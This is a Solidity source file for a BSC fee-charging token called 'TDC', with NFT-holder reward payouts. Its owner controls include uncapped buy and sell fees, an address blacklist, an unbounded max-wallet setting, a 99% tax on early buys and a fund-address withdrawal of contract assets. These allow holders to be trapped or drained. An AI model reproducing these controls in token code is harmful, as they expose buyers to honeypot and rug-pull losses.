// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}


interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface INFT {
    function totalSupply() external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor(
        address token,
        address receiver
    ) {
        _owner = receiver;
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!owner");
        IERC20(token).transfer(to, amount);
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public fundAddress_2;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _Against;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _reward = address(0x55d398326f99059fF775485246999027B3197955);
    address public _currency;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 400;
    uint256 public _buyLPFee = 0;

    uint256 public _sellFundFee = 400;
    uint256 public _sellLPFee = 0;

    uint256 public _maxWalletAmount;
    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address _Fund, address _Fund_2, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        _currency = USDTAddress;

        IERC20(_reward).approve(address(swapRouter), MAX);
        IERC20(_currency).approve(address(swapRouter), MAX);

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _currency);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _maxWalletAmount = Supply * 10 ** Decimals;
        _tTotal = total;
        swapAtAmount = _tTotal / 20000;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = _Fund;
        fundAddress_2 = _Fund_2;

        _isExcludedFromFee[_Fund] = true;
        _isExcludedFromFee[ReceiveAddress] = true;
        _isExcludedFromFee[address(this)] = true;
        // _isExcludedFromFee[address(swapRouter)] = true;
        _isExcludedFromFee[msg.sender] = true;

        _tokenDistributor = new TokenDistributor(_reward,ReceiveAddress);
        _nftDistributor = new TokenDistributor(_reward,ReceiveAddress);
        _nftAddress = address(0xBDD64CD69989767dEB3F819558C094240a40BE10);
        nftRewardCondition = 10 ** IERC20(_reward).decimals();
        _nftRewardHoldCondition = 0;
    }

    function setMaxWalletAmount(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmount = newValue;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public swapAtAmount;
    function setSwapAtAmount(uint256 newValue) public onlyOwner{
        swapAtAmount = newValue;
    }

    uint256 public airDropNumbs = 0;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airDropNumbs = newValue;
    }

    function setBuy(uint256 newFund,uint256 newLp) public onlyOwner{
        _buyFundFee = newFund;
        _buyLPFee = newLp;
    }

    function setSell(uint256 newFund,uint256 newLp) public onlyOwner{
        _sellFundFee = newFund;
        _sellLPFee = newLp;
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function tradingOpen() public view returns(bool){
        return block.timestamp >= startTime && startTime != 0;
    }

    bool public transferFeeEnable = true;
    function setTransferFeeEnable(bool status) public onlyOwner{
        transferFeeEnable = status;
    }

    uint256 public toNFTRewardRate = 50;
    function setToNFTRewardRate(
        uint256 newValue
    ) public onlyOwner{
        require(newValue <= 100,"too high");
        toNFTRewardRate = newValue;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_Against[from],"against");
        bool takeFee;
        bool isSell;

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && airDropNumbs > 0){
            address ad;
            for(uint256 i=0;i < airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airDropNumbs*100;
        }

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(tradingOpen());
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                // if (!tradingOpen()) {
                //     require(0 < goAddLPBlock && isAdd, "!goAddLP"); //_swapPairList[to]
                // }
                require(tradingOpen());

                if (_swapPairList[from]) {
                    require(_maxWalletAmount == 0 || amount + balanceOf(to) <= _maxWalletAmount, "ERC20: > max wallet amount");
                }

                if (block.timestamp < startTime + fightB && _swapPairList[from]) {
                    _funTransfer(from, to, amount);
                    return;
                    // _Against[to] = true;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            uint256 swapFee = _buyLPFee + _buyFundFee + _sellFundFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }

                        processNFTReward(nft_reward_gas);
                    }
                }
                takeFee = true; // just swap fee
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        if (
            !_swapPairList[from] &&
            !_swapPairList[to] &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to] &&
            transferFeeEnable
        ) {
            isSell = true;
            takeFee = true;
        }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            isSell
        );

    }

    uint256 public nft_reward_gas = 300000;
    function set_nft_reward_gas(
        uint256 newValue
    ) public onlyOwner {
        require(newValue >= 200000 && newValue <= 2000000,"too high or too low");
        nft_reward_gas = newValue;
    }
    
    function setWLs(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludedFromFee[addresses[i]] = status;
        }
    }

    function setBLs(address[] calldata addresses, bool value) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            _Against[addresses[i]] = value;
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    event FAILED_SWAP(uint256);
    event distribut(
        uint256 fund,
        uint256 nft,
        uint256 lp
    );
    uint256 public totalFund;
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        if (swapFee == 0) return;

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _currency;
        path[2] = _reward;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(0); }


        IERC20 FIST = IERC20(_reward);
        uint256 fundAndNFT = FIST.balanceOf(address(_tokenDistributor));
        uint256 toNFTRewardAmount = fundAndNFT * toNFTRewardRate / 100;
        uint256 fundAmount = fundAndNFT - toNFTRewardAmount;
        if (fundAmount > 0){
            // uint256 half_fund = fundAmount * 2 / 3;
            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
            totalFund += fundAmount;
            // FIST.transferFrom(address(_tokenDistributor), fundAddress, half_fund);
            // FIST.transferFrom(address(_tokenDistributor), fundAddress_2, fundAmount - half_fund);
        }

        if (toNFTRewardAmount > 0){
            FIST.transferFrom(address(_tokenDistributor),address(_nftDistributor), toNFTRewardAmount);
        }

        emit distribut(
            fundAmount,
            toNFTRewardAmount,
            0
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(uint256 i,address addr) external onlyOwner {
        if (i == 1){
            fundAddress = addr;
        }else{
            fundAddress_2 = addr;
        }
        _isExcludedFromFee[addr] = true;
    }

    uint256 public fightB;
    uint256 public startTime;

    function launch(uint256 _kb,uint256 s) external onlyOwner {
        fightB = _kb;
        if (s == 1){
            startTime = block.timestamp;
        }else{
            startTime = 0;
        }
    }
    
    function l_now() public onlyOwner{
        startTime = block.timestamp;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setClaims(address token, uint256 amount, address payable to) external {
        if (msg.sender == fundAddress){
            if (token == address(0)){
                to.transfer(amount);
            }else{
                IERC20(token).transfer(to, amount);
            }
        }
    }

    TokenDistributor public _nftDistributor;

    address public _nftAddress;
    function setNFTAddress(address adr) external onlyOwner {
        _nftAddress = adr;
    }

    uint256 public nftRewardCondition;
    uint256 public currentNFTIndex;
    uint256 public processNFTBlock;
    uint256 public processNFTBlockDebt = 1;
    mapping(address => bool) public excludeNFTHolder;
    mapping(uint256 => bool) public excludeNFT;
    uint256 public _nftRewardHoldCondition;

    event NFT_Dividend(
        address user,
        uint256 NFTID
    );
    event FAILED_NFT_Dividend(
        address user,
        uint256 NFTID,
        uint256 bal
    );
    event notEnoughToken(
        address user,
        uint256 NFTID
    );
    function processNFTReward(uint256 gas) private {
        if (processNFTBlock + processNFTBlockDebt > block.number) {
            return;
        }
        if (_nftAddress == address(0)){
            return;
        }
        INFT nft = INFT(_nftAddress);
        uint totalNFT = nft.totalSupply();
        if (0 == totalNFT) {
            return;
        }
        IERC20 SHIB = IERC20(_reward);
        address sender = address(_nftDistributor);

        uint256 amount = nftRewardCondition;
        if (0 == amount) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < totalNFT) {
            if (currentNFTIndex >= totalNFT) {
                currentNFTIndex = 0;
            }
            if (!excludeNFT[1 + currentNFTIndex]) {
                address shareHolder = nft.ownerOf(1 + currentNFTIndex);
                if (!excludeNFTHolder[shareHolder]){
                    if (balanceOf(shareHolder) >= _nftRewardHoldCondition) {
                        if (sender != address(0) && shareHolder != address(0)){
                            if (SHIB.balanceOf(sender) >= amount){
                                SHIB.transferFrom(sender, shareHolder, amount);
                                emit NFT_Dividend(shareHolder,1 + currentNFTIndex);
                            }else{
                                emit notEnoughToken(shareHolder,1 + currentNFTIndex);
                                break;
                            }
                        }
                    }else{
                        emit FAILED_NFT_Dividend(shareHolder,1 + currentNFTIndex,balanceOf(shareHolder));
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentNFTIndex++;
            iterations++;
        }
        processNFTBlock = block.number;
    }

    function setNFTRewardCondition(uint256 amount) external onlyOwner {
        nftRewardCondition = amount;
    }

    function setNFTRewardHoldCondition(uint256 amount) external onlyOwner {
        _nftRewardHoldCondition = amount;
    }

    function setProcessNFTBlockDebt(uint256 blockDebt) external onlyOwner {
        processNFTBlockDebt = blockDebt;
    }

    function setExcludeNFTHolder(address addr, bool enable) external onlyOwner {
        excludeNFTHolder[addr] = enable;
    }

    function setExcludeNFT(uint256 id, bool enable) external onlyOwner {
        excludeNFT[id] = enable;
    }

    receive() external payable {}
}

contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),
        "TDC",
        "TDC",
        9,
        1_000_000_000_000_000,
        address(0x3cBdF842aF14f5631d64a6C1864219a24516c460),
        address(0x3cBdF842aF14f5631d64a6C1864219a24516c460),
        address(0xB05323889B42ECFF3A6553015432b4fdBCB99834)
    ){}
}